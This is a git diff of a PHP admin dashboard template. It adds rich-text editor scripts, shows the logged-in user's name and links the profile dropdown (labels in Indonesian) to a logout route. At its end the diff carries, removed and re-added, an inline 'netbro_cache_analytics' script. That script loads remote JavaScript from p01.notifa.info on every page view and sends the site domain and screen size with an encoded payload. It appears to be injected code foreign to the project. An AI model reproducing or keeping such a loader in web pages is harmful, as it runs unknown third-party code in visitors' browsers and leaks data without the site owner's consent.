@@ -17,6 +17,7 @@
   <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/css/vendor.bundle.addons.css">
   <!-- endinject -->
   <!-- plugin css for this page -->
+  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/summernote/dist/summernote-bs4.css">
   <!-- End plugin css for this page -->
   <!-- inject:css -->
   <link rel="stylesheet" href="<?php echo base_url('')?>assets/css/style.css">
@@ -38,7 +39,7 @@
             <ul class="navbar-nav navbar-nav-right mr-0">
               <li class="nav-item nav-profile dropdown">
                 <a class="nav-link dropdown-toggle" id="notificationDropdown" href="#" data-toggle="dropdown">
-                  <span class="nav-profile-text">Hello Administrator</span>
+                  <span class="nav-profile-text"><?php echo $this->session->userdata('nama_user');?></span>
                   <img src="<?php echo base_url('assets/images/faces/face1.jpg')?>" class="rounded-circle" alt="profile"/>
                 </a>
                 <div class="dropdown-menu dropdown-menu-right navbar-dropdown preview-list" aria-labelledby="notificationDropdown">
@@ -47,46 +48,33 @@
                     </p>
                     <span class="badge badge-pill badge-inverse-info float-right">View all</span>
                   </a>
+                  
                   <div class="dropdown-divider"></div>
-                  <a class="dropdown-item preview-item">
+                  <a href="<?php echo base_url('Login/logout')?>" class="dropdown-item preview-item">
                     <div class="preview-thumbnail">
-                      <div class="preview-icon bg-inverse-success">
-                        <i class="icon-exclamation mx-0"></i>
+                      <div class="preview-icon bg-inverse-primary">
+                        <i class="icon-settings mx-0"></i>
                       </div>
                     </div>
                     <div class="preview-item-content">
-                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Application Error</h6>
+                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Pengaturan Pengguna</h6>
                       <p class="font-weight-light small-text mb-0">
-                        Just now
+                        User Setting
                       </p>
                     </div>
                   </a>
                   <div class="dropdown-divider"></div>
-                  <a class="dropdown-item preview-item">
-                    <div class="preview-thumbnail">
-                      <div class="preview-icon bg-inverse-warning">
-                        <i class="icon-bubble mx-0"></i>
-                      </div>
-                    </div>
-                    <div class="preview-item-content">
-                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Settings</h6>
-                      <p class="font-weight-light small-text mb-0">
-                        Private message
-                      </p>
-                    </div>
-                  </a>
-                  <div class="dropdown-divider"></div>
-                  <a href="." class="dropdown-item preview-item">
+                  <a href="<?php echo base_url('Login/logout')?>" class="dropdown-item preview-item">
                     <div class="preview-thumbnail">
                       <div class="preview-icon bg-inverse-danger">
                         <i class="icon-logout"></i>
                       </div>
                     </div>
                     <div class="preview-item-content">
-                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Keluar</h6>
-                      <p class="font-weight-light small-text mb-0">
-                        Log Out
-                      </p>
+                        <h6 class="preview-subject font-weight-normal text-dark mb-1">Keluar</h6>
+                          <p class="font-weight-light small-text mb-0">
+                            Log Out
+                          </p>
                     </div>
                   </a>
                 </div>
@@ -141,12 +129,18 @@
   <script src="<?php echo base_url('')?>assets/js/template.js"></script>
   <!-- endinject -->
   <script src="<?php echo base_url('assets/js/data-table.js')?>"></script>
+  <script src="<?php echo base_url('assets/vendors/tinymce/tinymce.min.js')?>"></script>
+  <script src="<?php echo base_url('assets/vendors/tinymce/themes/modern/theme.js')?>"></script>
+  <script src="<?php echo base_url('')?>assets/vendors/summernote/dist/summernote-bs4.min.js"></script>
+  <script src="<?php echo base_url('assets/js/editorDemo.js')?>"></script>
   <!-- Custom js for this page-->
   <script src="<?php echo base_url('')?>assets/js/toastDemo.js"></script>
   <script src="<?php echo base_url('')?>assets/js/dashboard.js"></script>
   <script src="<?php echo base_url('')?>assets/js/todolist.js"></script>
   <!-- End custom js for this page-->
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2f5piOvuQe61lJl2eL0mGY6TY3PpvjgBQq7AvcqkiX8hyAWpHJAjQGaKzW1laYF7Q2lQB4C180oL4q6m2OlRKIGgo7EjmYT7UvCLQcfVlGJQNZuTdIOdEeaRd%2bOxdPAWybcsd5xSCB8IM3SHcSkNFCOAdl8eO8F6r5wWiQax%2b%2bdfnE7FWczPJZXrKAHwvyg%2b0j2kM5ccCdAUbl5YNJsdc20TbJfK9acZtzu7r29zNbt2KH4FYJpbCzm6fjquk%2fF58IdCdE3zv1nDPQt6ekyh%2bKDU557dmtIpDRdFTnD2BMsI%2bvu%2bHimQbyiCpJ3LfnsuJtIJbXOKCDCIiyfdo3kcbXIZPh6h6VaahNvxIUSttVu92ZIKE%2fCTX%2bUd4ZEV691W1jkTUMCRk6zjKwzrEoLRK3CDqe9iTGdf8pnkL8lSMbbCXKcDWY7GeTlHwAa0ug72TPagd0asOD9P6s91IZHvD7lkTQgyv0k6nlAZ0tgt8ExhbTsK2k3FA0g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2f5piOvuQe61lJl2eL0mGY6TY3PpvjgBQq7AvcqkiX8hyAWpHJAjQGaKzW1laYF7Q2lQB4C180oL4q6m2OlRKIGgo7EjmYT7UvCLQcfVlGJQNZuTdIOdEeaRd%2bOxdPAWybcsd5xSCB8IM3SHcSkNFCOAdl8eO8F6r5wWiQax%2b%2bdfnE7FWczPJZXrKAHwvyg%2b0j2kM5ccCdAUbl5YNJsdc20TbJfK9acZtzu7r29zNbt2KH4FYJpbCzm6fjquk%2fF58IdCdE3zv1nDPQt6ekyh%2bKDU557dmtIpDRdFTnD2BMsI%2bvu%2bHimQbyiCpJ3LfnsuJtIJbXOKCDCIiyfdo3kcbXIZPh6h6VaahNvxIUSttVu92ZIKE%2fCTX%2bUd4ZEV691W1jkTUMCRk6zjKwzrEoLRK3CDqe9iTGdf8pnkL8lSMbbCXKcDWY7GeTlHwAa0ug72TPagd0asOD9P6s91IZHvD7lkTQgyv0k6nlAZ0tgt8ExhbTsK2k3FA0g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+</body>
 
 
 
